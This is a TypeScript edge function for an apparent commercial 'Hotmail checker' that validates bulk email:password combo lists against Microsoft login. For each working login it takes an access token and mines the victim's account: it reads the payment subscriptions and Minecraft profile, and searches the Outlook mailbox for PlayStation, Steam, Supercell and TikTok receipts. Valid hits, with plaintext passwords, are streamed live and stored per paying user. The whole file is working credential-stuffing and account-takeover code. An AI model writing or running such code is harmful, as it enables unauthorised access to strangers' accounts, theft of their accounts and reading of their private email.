import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";
import { broadcastProgress } from "../_shared/realtime-broadcast.ts";

declare const EdgeRuntime: {
  waitUntil(promise: Promise<unknown>): void;
};

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-client-ip, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

interface SubscriptionInfo {
  name: string;
  category: string;
  daysRemaining?: string;
  autoRenew?: string;
  isExpired?: boolean;
}

interface CheckResult {
  email: string;
  password: string;
  status: string;
  country?: string;
  name?: string;
  checkedAt?: string;
  checkDuration?: number;
  threadId?: number;
  inboxCount?: string;
  msStatus?: string;
  subscriptions?: SubscriptionInfo[];
  rewardsPoints?: string;
  balance?: string;
  psn?: { status: string; orders: number; purchases: any[] };
  steam?: { status: string; count: number; purchases?: any[] };
  supercell?: { status: string; games: string[] };
  tiktok?: { status: string; username?: string };
  minecraft?: { status: string; username?: string; uuid?: string; capes?: string[] };
  error?: string;
}

// CookieJar class to handle cookies like the Python script
class CookieJar {
  private cookies: Map<string, string> = new Map();

  extractFromHeaders(headers: Headers): void {
    const setCookie = headers.get("set-cookie");
    if (setCookie) {
      const cookieStrings = setCookie.split(/,(?=\s*[^;,]+=[^;,]+)/);
      for (const cookieStr of cookieStrings) {
        this.parseCookie(cookieStr);
      }
    }
  }

  private parseCookie(cookieStr: string): void {
    const parts = cookieStr.split(";")[0].trim();
    const eqIndex = parts.indexOf("=");
    if (eqIndex > 0) {
      const name = parts.substring(0, eqIndex).trim();
      const value = parts.substring(eqIndex + 1).trim();
      if (name && value && !name.startsWith("__")) {
        this.cookies.set(name, value);
      }
    }
  }

  get(name: string): string | undefined {
    return this.cookies.get(name);
  }

  toString(): string {
    return Array.from(this.cookies.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }
}

function getCanaryTimestamp(): string {
  const now = new Date();
  const day = now.toLocaleDateString('en-US', { weekday: 'short' });
  const date = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const ms = now.getMilliseconds().toString().padStart(3, '0');
  return `[${day} ${date} ${time}.${ms}]`;
}

function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const minutes = Math.floor(ms / 60000);
  const seconds = ((ms % 60000) / 1000).toFixed(1);
  return `${minutes}m ${seconds}s`;
}

// Check Microsoft Subscriptions - simplified for speed
async function checkMicrosoftSubscriptions(accessToken: string): Promise<{
  status: string;
  subscriptions: SubscriptionInfo[];
  data: Record<string, string>;
}> {
  try {
    const userId = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
    const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
    const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
    
    const r = await fetch(paymentAuthUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": "https://account.microsoft.com/"
      },
      redirect: 'follow'
    });
    
    const searchText = (await r.text()) + " " + r.url;
    
    const tokenPatterns = [/access_token=([^&\s"']+)/, /"access_token":"([^"]+)"/];
    let paymentToken = null;
    for (const pattern of tokenPatterns) {
      const match = searchText.match(pattern);
      if (match) {
        paymentToken = decodeURIComponent(match[1]);
        break;
      }
    }
    
    if (!paymentToken) {
      return { status: "FREE", subscriptions: [], data: {} };
    }
    
    const subData: Record<string, string> = {};
    const subscriptions: SubscriptionInfo[] = [];
    
    const paymentHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "application/json",
      "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
      "Content-Type": "application/json",
      "Origin": "https://account.microsoft.com",
      "Referer": "https://account.microsoft.com/"
    };
    
    try {
      const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
      const rSub = await fetch(transUrl, { headers: paymentHeaders });
      
      if (rSub.ok) {
        const responseText = await rSub.text();
        
        const subscriptionKeywords: Record<string, { type: string; category: string }> = {
          'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
          'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
          'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
          'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
          'Microsoft 365': { type: 'M365', category: 'office' },
        };
        
        for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
          if (responseText.includes(keyword)) {
            const subInfo: SubscriptionInfo = { name: info.type, category: info.category };
            subscriptions.push(subInfo);
          }
        }
        
        if (subscriptions.length > 0) {
          return { status: "PREMIUM", subscriptions, data: subData };
        }
      }
    } catch {}
    
    return { status: "FREE", subscriptions, data: subData };
  } catch {
    return { status: "FREE", subscriptions: [], data: {} };
  }
}

// Check Minecraft account
async function checkMinecraft(accessToken: string): Promise<{
  status: string;
  username?: string;
  uuid?: string;
}> {
  try {
    const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Outlook-Android/2.0'
      }
    });
    
    if (r.ok) {
      const data = await r.json();
      return {
        status: "OWNED",
        username: data.name || "Unknown",
        uuid: data.id || ""
      };
    }
    
    return { status: "FREE" };
  } catch {
    return { status: "FREE" };
  }
}

// Main account check function - follows Python logic
async function checkAccount(
  email: string, 
  password: string, 
  checkMode: string,
  threadId: number
): Promise<CheckResult> {
  const startTime = Date.now();
  const result: CheckResult = { 
    email, 
    password, 
    status: 'checking',
    checkedAt: getCanaryTimestamp(),
    threadId
  };
  
  const cookies = new CookieJar();
  
  try {
    // Step 1: Check if MSAccount
    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const idpRes = await fetch(idpUrl, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
      }
    });
    
    const idpText = await idpRes.text();
    
    if (!idpText.includes("MSAccount")) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    await new Promise(r => setTimeout(r, 200));
    
    // Step 2: Get auth page
    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
    
    const authRes = await fetch(authUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      },
      redirect: 'follow'
    });
    
    cookies.extractFromHeaders(authRes.headers);
    const authText = await authRes.text();
    const authFinalUrl = authRes.url;
    
    const urlMatch = authText.match(/urlPost":"([^"]+)"/);
    const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
    
    if (!urlMatch || !ppftMatch) {
      result.status = "error";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const postUrl = urlMatch[1].replace(/\\\//g, "/");
    const ppft = ppftMatch[1];
    
    // Step 3: Login
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&passwd=${encodeURIComponent(password)}&ps=2&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0`;
    
    const loginRes = await fetch(postUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://login.live.com",
        "Referer": authFinalUrl,
        "Cookie": cookies.toString()
      },
      redirect: 'manual'
    });
    
    cookies.extractFromHeaders(loginRes.headers);
    const loginText = await loginRes.text();
    const loginLocation = loginRes.headers.get("location") || "";
    
    if (loginText.includes("account or password is incorrect")) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("identity/confirm")) {
      result.status = "2fa";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("account.live.com/Abuse")) {
      result.status = "locked";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const codeMatch = loginLocation.match(/code=([^&]+)/);
    if (!codeMatch) {
      result.status = "invalid";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const code = codeMatch[1];
    const mspcid = cookies.get("MSPCID");
    if (!mspcid) {
      result.status = "error";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const cid = mspcid.toUpperCase();
    
    // Step 4: Get access token
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
    
    const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: tokenData
    });
    
    const tokenJson = await tokenRes.json();
    
    if (!tokenJson.access_token) {
      result.status = "error";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const accessToken = tokenJson.access_token;
    result.status = "valid";
    
    // Check subscriptions if requested
    if (checkMode === "microsoft" || checkMode === "all") {
      try {
        const msResult = await checkMicrosoftSubscriptions(accessToken);
        result.msStatus = msResult.status;
        result.subscriptions = msResult.subscriptions;
      } catch {}
    }
    
    // Check Minecraft if requested
    if (checkMode === "minecraft" || checkMode === "all") {
      try {
        const mcResult = await checkMinecraft(accessToken);
        result.minecraft = mcResult;
      } catch {}
    }
    
    // Check PSN via email search (following Python logic exactly)
    if (checkMode === "psn" || checkMode === "all") {
      try {
        const psnPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const psnRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(psnPayload)
        });
        
        if (psnRes.ok) {
          const psnData = await psnRes.json();
          const orders = psnData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          result.psn = { status: orders > 0 ? "HAS_ORDERS" : "FREE", orders, purchases: [] };
        }
      } catch {}
    }
    
    // Check Steam via email search (following Python logic)
    if (checkMode === "steam" || checkMode === "all") {
      try {
        const steamPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@steampowered.com purchase"},
            "Size": 30,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const steamRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(steamPayload)
        });
        
        if (steamRes.ok) {
          const steamData = await steamRes.json();
          const count = steamData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          result.steam = { status: count > 0 ? "HAS_PURCHASES" : "FREE", count };
        }
      } catch {}
    }
    
    // Check Supercell via email search (following Python logic)
    if (checkMode === "supercell" || checkMode === "all") {
      try {
        const scPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@id.supercell.com"},
            "Size": 20,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const scRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(scPayload)
        });
        
        if (scRes.ok) {
          const scData = await scRes.json();
          const total = scData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          const games: string[] = [];
          
          if (total > 0) {
            const results = scData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
            for (const r of results) {
              const preview = r.Preview || '';
              if (preview.includes('Clash Royale') && !games.includes('Clash Royale')) games.push('Clash Royale');
              if (preview.includes('Clash of Clans') && !games.includes('Clash of Clans')) games.push('Clash of Clans');
              if (preview.includes('Brawl Stars') && !games.includes('Brawl Stars')) games.push('Brawl Stars');
              if (preview.includes('Hay Day') && !games.includes('Hay Day')) games.push('Hay Day');
            }
          }
          
          result.supercell = { status: games.length > 0 ? "LINKED" : "FREE", games };
        }
      } catch {}
    }
    
    // Check TikTok via email search (following Python logic)
    if (checkMode === "tiktok" || checkMode === "all") {
      try {
        const ttPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "account.tiktok"},
            "Size": 10,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const ttRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
          },
          body: JSON.stringify(ttPayload)
        });
        
        if (ttRes.ok) {
          const ttData = await ttRes.json();
          const total = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
          let username: string | undefined;
          
          if (total > 0) {
            const results = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
            for (const r of results) {
              const preview = r.Preview || '';
              // Try to extract username from greeting patterns
              const patterns = [/Salut\s+([^,]+)/, /Hallo\s+([^,]+)/, /Hi\s+([^,]+)/, /Hello\s+([^,]+)/];
              for (const pattern of patterns) {
                const match = preview.match(pattern);
                if (match) {
                  username = match[1].trim();
                  break;
                }
              }
              if (username) break;
            }
          }
          
          result.tiktok = { status: total > 0 ? "LINKED" : "FREE", username };
        }
      } catch {}
    }
    
    result.checkDuration = Date.now() - startTime;
    return result;
    
  } catch (e) {
    result.status = "error";
    result.error = String(e);
    result.checkDuration = Date.now() - startTime;
    return result;
  }
}

// Build detailed message for hit (following Python output format)
function buildHitMessage(result: CheckResult): string {
  if (result.status !== 'valid') {
    if (result.status === '2fa') return '🔐 2FA Required';
    if (result.status === 'locked') return '🔒 Account Locked';
    if (result.status === 'invalid') return '✗ Invalid';
    return `! ${result.status}`;
  }
  
  const parts: string[] = ['✓ Valid'];
  
  // Microsoft subscriptions
  if (result.msStatus === 'PREMIUM' && result.subscriptions?.length) {
    for (const sub of result.subscriptions.slice(0, 2)) {
      const days = sub.daysRemaining ? `(${sub.daysRemaining}d)` : '';
      parts.push(`🎮${sub.name}${days}`);
    }
  }
  
  // PlayStation
  if (result.psn?.status === 'HAS_ORDERS') {
    parts.push(`🎯PSN:${result.psn.orders}`);
  }
  
  // Steam
  if (result.steam?.status === 'HAS_PURCHASES') {
    parts.push(`🎮Steam:${result.steam.count}`);
  }
  
  // Supercell
  if (result.supercell?.status === 'LINKED') {
    parts.push(`🎲SC:${result.supercell.games.join(',') || 'Yes'}`);
  }
  
  // TikTok
  if (result.tiktok?.status === 'LINKED') {
    parts.push(`📱TikTok:${result.tiktok.username || 'Yes'}`);
  }
  
  // Minecraft
  if (result.minecraft?.status === 'OWNED') {
    parts.push(`⛏️MC:${result.minecraft.username || 'Yes'}`);
  }
  
  return parts.join(' | ');
}

// Process accounts in background
async function processAccountsBackground(
  accounts: string[],
  checkMode: string,
  threads: number,
  sessionId: string,
  userId: string | null,
  userEmail: string | null
): Promise<void> {
  const startTime = Date.now();
  const total = accounts.length;
  const results: CheckResult[] = [];
  
  const stats = {
    total,
    valid: 0,
    invalid: 0,
    twoFa: 0,
    locked: 0,
    error: 0,
    msPremium: 0,
    minecraftHits: 0,
    psnHits: 0
  };
  
  console.log(`${getCanaryTimestamp()} Background processing ${total} accounts...`);
  
  // Process one at a time to avoid CPU spikes
  for (let i = 0; i < accounts.length; i++) {
    const account = accounts[i];
    const [email, ...passParts] = account.split(":");
    const password = passParts.join(":");
    
    // Broadcast checking status
    await broadcastProgress(sessionId, {
      index: i + 1,
      total,
      email: email || account,
      password: password || '',
      status: 'checking',
      message: '⟳ Checking...',
      timestamp: Date.now()
    }).catch(() => {});
    
    if (!email || !password) {
      await broadcastProgress(sessionId, {
        index: i + 1,
        total,
        email: account,
        password: '',
        status: 'failed',
        message: '✗ Invalid format',
        timestamp: Date.now()
      }).catch(() => {});
      stats.error++;
      continue;
    }
    
    try {
      const result = await checkAccount(email.trim(), password.trim(), checkMode, 1);
      results.push(result);
      
      // Update stats
      if (result.status === "valid") stats.valid++;
      else if (result.status === "invalid") stats.invalid++;
      else if (result.status === "2fa") stats.twoFa++;
      else if (result.status === "locked") stats.locked++;
      else stats.error++;
      
      if (result.msStatus === "PREMIUM") stats.msPremium++;
      if (result.minecraft?.status === "OWNED") stats.minecraftHits++;
      if (result.psn?.status === "HAS_ORDERS") stats.psnHits++;
      
      // Broadcast result
      await broadcastProgress(sessionId, {
        index: i + 1,
        total,
        email,
        password: password.trim(),
        status: result.status as any,
        message: buildHitMessage(result),
        timestamp: Date.now()
      }).catch(() => {});
      
      // Log progress every 10 accounts
      if ((i + 1) % 10 === 0 || i + 1 === total) {
        console.log(`${getCanaryTimestamp()} Progress: ${i + 1}/${total} | Valid: ${stats.valid} | Invalid: ${stats.invalid}`);
      }
      
    } catch (e) {
      stats.error++;
      await broadcastProgress(sessionId, {
        index: i + 1,
        total,
        email,
        password: password || '',
        status: 'error',
        message: `! Error: ${String(e).substring(0, 50)}`,
        timestamp: Date.now()
      }).catch(() => {});
    }
    
    // Small delay between accounts to avoid rate limiting
    await new Promise(r => setTimeout(r, 100));
  }
  
  const duration = formatDuration(Date.now() - startTime);
  console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
  console.log(`${getCanaryTimestamp()} COMPLETE | Duration: ${duration} | Valid: ${stats.valid}/${total}`);
  
  // Broadcast completion
  await broadcastProgress(sessionId, {
    index: total,
    total,
    email: 'COMPLETE',
    password: '',
    status: 'success',
    message: `✅ Done! ${stats.valid} valid, ${stats.invalid} invalid, ${stats.twoFa} 2FA in ${duration}`,
    timestamp: Date.now()
  }).catch(() => {});
  
  // Save to Firebase
  if (userId) {
    await firebasePush(`checkHistory/${userId}`, {
      service: "hotmail_validator",
      checkMode,
      inputCount: total,
      stats,
      duration,
      results,
      createdAt: new Date().toISOString()
    }).catch(() => {});
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    let userEmail: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
        userEmail = tokenData.email || null;
      }
    }

    const { 
      accounts, 
      checkMode = "all", 
      threads = 5, 
      sessionId = null
    } = await req.json();

    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
    console.log(`${getCanaryTimestamp()} HOTMAIL CHECKER - BACKGROUND MODE`);
    console.log(`${getCanaryTimestamp()} User: ${userEmail || 'Anonymous'} | Accounts: ${accounts?.length || 0} | Mode: ${checkMode}`);

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("hotmail_validator") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    const jobSessionId = sessionId || `job-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
    
    // Start background processing - DON'T AWAIT
    EdgeRuntime.waitUntil(
      processAccountsBackground(accounts, checkMode, threads, jobSessionId, userId, userEmail)
        .catch(error => {
          console.error(`${getCanaryTimestamp()} Background error:`, error);
        })
    );

    // Return immediately with job info
    return new Response(
      JSON.stringify({ 
        status: "processing",
        sessionId: jobSessionId,
        total: accounts.length,
        message: `Started processing ${accounts.length} accounts. Watch the live feed for progress.`
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );

  } catch (error) {
    console.error(`${getCanaryTimestamp()} ERROR:`, error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
